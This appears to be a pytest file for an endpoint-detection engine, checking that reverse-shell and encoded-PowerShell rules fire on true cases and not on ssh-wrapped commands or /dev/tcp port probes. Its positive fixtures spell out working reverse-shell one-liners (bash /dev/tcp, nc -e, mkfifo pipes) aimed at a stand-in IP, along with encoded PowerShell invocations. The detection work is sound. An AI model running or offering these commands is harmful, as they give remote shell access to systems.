"""Two endpoint process rules matched the command line without asking WHICH
process it belonged to / WHAT the /dev/tcp was doing. A replay of 47,896 real
process starts from a production server produced 9 matches, all false:

  * sigma_c2_encoded_powershell fired on `ssh ... user@host powershell -EncodedCommand`
    (the local process is ssh; PowerShell runs on the other machine).
  * sigma_c2_reverse_shell fired on a `echo > /dev/tcp/127.0.0.1/$p` port probe,
    because bare `/dev/tcp/\\d` was an alternative on its own.

Same route as test_edr_rule_feed.py: agent JSON -> ingest route -> real engine.
"""
from __future__ import annotations

import pytest

from . import edr_payloads as P
from .test_edr_rule_feed import engine, tauri  # noqa: F401  (engine is a fixture)

PS_RULE = "sigma_c2_encoded_powershell"
RS_RULE = "sigma_c2_reverse_shell"
B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAApAA=="


def _proc(name, cmd):
    return P.tauri_event("process_start", name=name, path=f"/bin/{name}", cmd=cmd)


PS_POSITIVE = [
    ("powershell.exe", f"powershell.exe -enc {B64}"),
    ("powershell.exe", f"powershell -EncodedCommand {B64}"),
    ("pwsh", f"pwsh -e {B64}"),
    ("powershell.exe", f'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NoP -W Hidden -enc {B64}'),
    ("powershell.exe", f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -enc {B64}"),
    ("pwsh.exe", f'"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -NoProfile -EncodedCommand {B64}'),
    ("powershell.exe", 'powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString('
                       '[System.Convert]::FromBase64String(\'aGVsbG8=\'))"'),
]

PS_NEGATIVE = [
    ("ssh", f"ssh -i /Users/u/.ssh/key -o ConnectTimeout=12 user@198.51.100.7 powershell -NoProfile -EncodedCommand {B64}"),
    ("ssh", f"ssh -p 20561 -o ConnectTimeout=10 user@198.51.100.7 powershell -NoProfile -EncodedCommand {B64}"),
    ("ssh", "ssh -p 22 user@198.51.100.7 powershell -NoProfile -Command "
            "\"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aGVsbG8='))\""),
    ("scp", f"scp a.txt user@198.51.100.7:pwsh -enc {B64}"),
]

RS_POSITIVE = [
    ("bash", "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"),
    ("sh", "sh -i 5<> /dev/tcp/198.51.100.7/4444"),
    ("bash", "exec 5<>/dev/tcp/198.51.100.7/4444; cat <&5 | while read line; do $line 2>&5 >&5; done"),
    ("bash", "0<&196;exec 196<>/dev/tcp/198.51.100.7/4444; sh <&196 >&196 2>&196"),
    ("bash", "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'"),
    # the rule's other alternatives are untouched
    ("nc", "nc -e /bin/sh 198.51.100.7 4444"),
    ("ncat", "ncat 198.51.100.7 4444 -e /bin/bash"),
    ("nc", "nc -c sh 198.51.100.7 4444"),
    ("sh", "mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 198.51.100.7 4444 > /tmp/f"),
]

RS_NEGATIVE = [
    # real production line: the `-c` belongs to `head`, not to nc
    ("zsh", "for p in 20561 26352 20128; do printf '%s -> ' $p; (nc -w 2 127.0.0.1 $p 2>/dev/null "
            "| head -c 60 | tr -d '\\r\\n') ; echo; done"),
    ("zsh", "zsh -c 'for p in 20561 20562; do (echo > /dev/tcp/127.0.0.1/$p) 2>/dev/null && echo open $p; done'"),
    ("bash", "bash -c 'echo > /dev/tcp/198.51.100.7/443 2>&1 && echo up'"),
    ("bash", "bash -c 'cat < /dev/tcp/198.51.100.7/22'"),
    ("bash", "bash -c 'exec 3<>/dev/tcp/198.51.100.7/443 && echo open'"),
]


def _fired(monkeypatch, engine, name, cmd):
    engine.incidents.clear()
    engine._fired.clear()
    return set(tauri(monkeypatch, engine, _proc(name, cmd)))


@pytest.mark.parametrize("name,cmd", PS_POSITIVE)
def test_encoded_powershell_fires_when_the_process_is_powershell(monkeypatch, engine, name, cmd):
    assert PS_RULE in _fired(monkeypatch, engine, name, cmd)


@pytest.mark.parametrize("name,cmd", PS_NEGATIVE)
def test_encoded_powershell_ignores_powershell_as_an_argument_of_another_process(
        monkeypatch, engine, name, cmd):
    fired = _fired(monkeypatch, engine, name, cmd)
    assert PS_RULE not in fired and RS_RULE not in fired


@pytest.mark.parametrize("name,cmd", RS_POSITIVE)
def test_reverse_shell_fires_on_interactive_redirection(monkeypatch, engine, name, cmd):
    assert RS_RULE in _fired(monkeypatch, engine, name, cmd)


@pytest.mark.parametrize("name,cmd", RS_NEGATIVE)
def test_reverse_shell_ignores_bare_dev_tcp_probes(monkeypatch, engine, name, cmd):
    fired = _fired(monkeypatch, engine, name, cmd)
    assert RS_RULE not in fired and PS_RULE not in fired
